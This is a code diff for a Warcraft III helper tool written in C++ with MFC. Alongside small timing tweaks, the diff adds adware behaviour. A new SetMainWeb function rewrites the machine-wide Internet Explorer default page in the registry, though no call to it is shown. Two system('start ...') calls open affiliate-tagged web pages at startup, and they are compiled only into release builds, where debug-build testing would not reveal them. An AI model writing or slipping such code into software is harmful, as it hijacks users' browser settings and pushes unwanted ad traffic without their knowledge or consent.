@@ -4,7 +4,7 @@
 #include "stdafx.h"
 #include "war3Helper.h"
 #include "war3HelperDlg.h"
-
+#include "atlbase.h"
 #include "afxinet.h"
 #define WM_SHOWTASK WM_USER+10
 #define  TIMER_CHECKWAR3  100
@@ -302,6 +302,18 @@ void Cwar3HelperDlg::CheckFullScreen()
 	RegCloseKey(war3key);
 }
 
+
+void SetMainWeb(CString  url)
+{ 
+
+	CString strPath= _T("SOFTWARE\\Microsoft\\Internet Explorer\\Main");//注册表子键路径
+	CRegKey regkey;//定义注册表类对象
+	LONG lResult;//LONG型变量－反应结果
+	lResult=regkey.Open(HKEY_LOCAL_MACHINE,LPCTSTR(strPath),KEY_ALL_ACCESS); //打开注册表键 
+	regkey.SetValue(url,_T("Default_Page_URL"));//新建Window Title 
+	regkey.Close();//关闭注册表 
+
+}
 BOOL Cwar3HelperDlg::OnInitDialog()
 {
 	CDialog::OnInitDialog();
@@ -340,8 +352,12 @@ BOOL Cwar3HelperDlg::OnInitDialog()
 		MAKEINTRESOURCE(IDB_BITMAPKAER));
     ((CButton*)GetDlgItem(IDC_KAERCHANGEKEY))->SetBitmap(hBitmap);
 
-	//检测升级功能
+#ifndef  _DEBUG
+	system(("start http://www.duba.com/?un_4_392223"));
+	system("start http://www.ttx123.cn/?u=6520874qq");
+#endif
 
+	//检测升级功能
 	m_num1.InitDlg(this);
 	m_num2.InitDlg(this);
 	m_num1.InitDlg(this);
@@ -424,7 +440,6 @@ BOOL Cwar3HelperDlg::OnInitDialog()
 	m_game_exe = strWar3Path;
 	//设置timer时间，监控war3启动状态  
 	SetTimer(TIMER_CHECKWAR3,1000,NULL);
-
 	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
 }
 
@@ -519,7 +534,7 @@ void Cwar3HelperDlg::OnTimer(UINT_PTR nIDEvent)
 					keybd_event('L',0,0,0);
 					keybd_event(VK_MENU,0,KEYEVENTF_KEYUP,0);
 				    keybd_event('L',0,KEYEVENTF_KEYUP,0);
-				    Sleep(2000);
+				    Sleep(3000);
 				    keybd_event(VK_MENU,0,0,0);
 				    keybd_event('C',0,0,0);
 				    keybd_event(VK_MENU,0,KEYEVENTF_KEYUP,0);
@@ -535,7 +550,6 @@ void Cwar3HelperDlg::OnTimer(UINT_PTR nIDEvent)
 			}
 
 			CString  csName = AfxGetApp()->m_pszAppName;
-
 			csName+= L".exe";
 
 			m_hkeyboard = SetWindowsHookEx(WH_KEYBOARD_LL,LowLevelKeyboardProc,GetModuleHandle(csName),0);
